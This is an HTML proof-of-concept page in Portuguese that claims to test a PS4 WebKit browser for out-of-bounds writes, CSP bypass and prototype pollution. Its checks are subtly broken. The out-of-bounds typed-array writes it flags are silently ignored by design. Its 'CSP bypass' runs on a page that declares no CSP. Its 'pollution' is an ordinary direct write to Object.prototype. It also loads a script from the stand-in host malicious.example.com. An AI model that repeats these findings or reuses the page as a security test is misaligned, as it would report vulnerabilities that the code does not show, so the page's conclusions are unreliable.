<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit PoC - OOB Write / CSP Bypass / Prototype Pollution</title>
    <style>
        body { background: #111; color: #eee; font-family: monospace; padding: 15px; font-size: 14px; }
        #poc-output { background: #222; border: 1px solid #444; padding: 10px; height: 70vh; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
        .log-info { color: #6cf; }
        .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; }
        .log-vuln { color: #f44336; font-weight: bold; background-color: #444; padding: 2px 4px; display: inline-block;}
        .log-good { color: #4CAF50; }
        .log-warn { color: #FFC107; }
    </style>
</head>
<body>
    <h1>PS4 WebKit PoC - Demonstração Combinada</h1>
    <p>Observação: Este script tenta demonstrar vulnerabilidades (OOB Write, CSP Bypass, Prototype Pollution). Carregue em um PS4 com firmware vulnerável (ex: 11.02 ou similar, conforme reportado) e observe o log abaixo.</p>
    <div id="poc-output"></div>

    <script>
        const outputDiv = document.getElementById('poc-output');
        const log = (message, type = 'info') => {
            if (outputDiv) {
                const timestamp = `[${new Date().toLocaleTimeString()}] `;
                outputDiv.innerHTML += `<span class="log-${type}">${timestamp}${message}\n</span>`;
                outputDiv.scrollTop = outputDiv.scrollHeight; // Auto-scroll
            } else {
                console.error("Elemento #poc-output não encontrado!");
            }
        };

        // --- Teste 1: Out-Of-Bounds (OOB) Write ---
        const runOOBTest = async () => {
            log("--- Iniciando Teste: OOB Write ---", 'test');
            try {
                const bufferSize = 32;
                const buffer = new ArrayBuffer(bufferSize);
                const view = new Uint8Array(buffer);
                const writeValue = 0xEE;
                // Offsets que demonstraram sucesso nos logs originais
                const testOffsets = [-1, bufferSize, bufferSize + 1];

                for (const offset of testOffsets) {
                    log(`Tentando escrita OOB no offset ${offset}...`, 'info');
                    try {
                        view[offset] = writeValue;
                        // Se chegou aqui sem erro, é a vulnerabilidade!
                        log(`VULNERÁVEL: Escrita OOB no offset ${offset} bem-sucedida (sem erro)!`, 'vuln');
                    } catch (writeError) {
                        log(`✅ Escrita OOB no offset ${offset} bloqueada/erro: ${writeError.message}`, 'good');
                    }
                    await new Promise(resolve => setTimeout(resolve, 50)); // Pequena pausa
                }
                log("--- Teste OOB Concluído ---", 'test');

            } catch (e) {
                log(`Erro GERAL no teste OOB: ${e.message}`, 'warn');
            }
        };

        // --- Teste 2: CSP Bypass ---
        const runCSPTest = () => {
            log("--- Iniciando Teste: CSP Bypass ---", 'test');

            // 2.1: Teste com data: URI (deve funcionar se vulnerável)
            log("Tentando carregar script via data: URI...", 'info');
            try {
                const scriptTag = document.createElement('script');
                // Base64 de: log("VULNERÁVEL: Bypass de CSP via data: URI bem-sucedido!", 'vuln');
                scriptTag.src = 'data:text/javascript;base64,bG9nKCJWVUxORVLCgVZFTDogQnlwYXNzIGRlIENTUCB2aWEgZGF0YTogVVJJIGJlbS1zdWNlZGlkbyEiLCAndnVsbicpOw==';
                document.body.appendChild(scriptTag);
                // Log de sucesso será adicionado pela própria tag script se funcionar
            } catch (e) {
                 log(`Erro ao criar tag script data:: ${e.message}`, 'warn');
            }

            // 2.2: Teste com inline handler (deve funcionar se vulnerável)
            log("Tentando executar script via inline handler (onerror)...", 'info');
            try {
                const imgTag = document.createElement('img');
                imgTag.src = 'x'; // Força o erro
                imgTag.onerror = () => { log("VULNERÁVEL: Bypass de CSP via inline handler 'onerror' bem-sucedido!", 'vuln'); };
                document.body.appendChild(imgTag);
                 // Log de sucesso será adicionado pelo próprio handler se funcionar
            } catch (e) {
                 log(`Erro ao criar tag img com onerror: ${e.message}`, 'warn');
            }

            // 2.3: Teste com fonte externa (deve ser bloqueado)
            log("Tentando carregar script de fonte externa (deve ser bloqueado)...", 'info');
             try {
                const externalScript = document.createElement('script');
                externalScript.src = 'https://malicious.example.com/blocked.js'; // Domínio não existente/confiável
                externalScript.onload = () => { log("ERRO DE LÓGICA: CSP NÃO bloqueou script externo!", 'vuln'); }; // Não deve acontecer
                externalScript.onerror = () => { log("✅ Bloqueio CSP esperado para script externo funcionou (ou falha de rede).", 'good'); }; // Esperado
                document.body.appendChild(externalScript);
            } catch (e) {
                 log(`Erro ao criar tag script externa: ${e.message}`, 'warn');
            }

            log("--- Teste CSP Concluído (Verifique logs acima para resultados 'VULNERÁVEL') ---", 'test');
        };

        // --- Teste 3: Prototype Pollution ---
        const runPrototypePollutionTest = () => {
            log("--- Iniciando Teste: Prototype Pollution ---", 'test');
            const pollutionKey = 'poc_injected_property';
            const pollutionValue = 'Polluted!';

            try {
                log(`Tentando poluir Object.prototype com '${pollutionKey}'...`, 'info');
                Object.prototype[pollutionKey] = pollutionValue;

                // Verificar poluição em objetos chave
                const testObjects = { 'window': window, 'document': document, 'novoObjeto': {} };
                let pollutedCount = 0;
                for (const name in testObjects) {
                    try {
                         // Usar 'in' ou 'hasOwnProperty' pode ser enganado, checar diretamente
                         // Cuidado com accessors que podem gerar erro
                         if (testObjects[name] && testObjects[name][pollutionKey] === pollutionValue) {
                            log(`VULNERÁVEL: Prototype Pollution detectada! ${name}.${pollutionKey} = ${testObjects[name][pollutionKey]}`, 'vuln');
                            pollutedCount++;
                        } else {
                             // Pode não ter herdado ou ser um objeto sem prototype chain padrão
                             // log(`Objeto '${name}' não parece diretamente poluído ou inacessível.`, 'info');
                        }
                    } catch(checkError){
                         log(`Aviso ao verificar ${name}: ${checkError.message}`, 'warn');
                    }
                }

                if (pollutedCount > 0) {
                     log(`Confirmação: ${pollutedCount} objeto(s) chave demonstraram herdar a propriedade poluída.`, 'vuln');
                } else {
                     log(`Aviso: Não foi possível confirmar a poluição nos objetos de teste. Verifique manualmente.`, 'warn');
                }

                 // Limpeza (importante!)
                 try {
                    delete Object.prototype[pollutionKey];
                    log("Tentativa de limpar poluição do prototype.", 'info');
                 } catch (cleanError){
                    log(`Erro ao limpar poluição: ${cleanError.message}`, 'warn');
                 }


            } catch (e) {
                log(`Erro GERAL no teste de Prototype Pollution: ${e.message}`, 'warn');
            }
             log("--- Teste Prototype Pollution Concluído ---", 'test');
        };

        // --- Função Principal de Execução ---
        const runAllTests = async () => {
            log("Iniciando todos os testes de PoC...");

            await runOOBTest();
            log("\nPausa de 2 segundos...\n", 'info');
            await new Promise(resolve => setTimeout(resolve, 2000));

            runCSPTest();
            log("\nPausa de 2 segundos...\n", 'info');
            await new Promise(resolve => setTimeout(resolve, 2000));

            runPrototypePollutionTest();

            log("\n\nTodos os testes PoC foram concluídos. Revise o log acima.", 'test');
        };

        // Executar ao carregar a página
        document.addEventListener('DOMContentLoaded', runAllTests);

    </script>

</body>
</html>
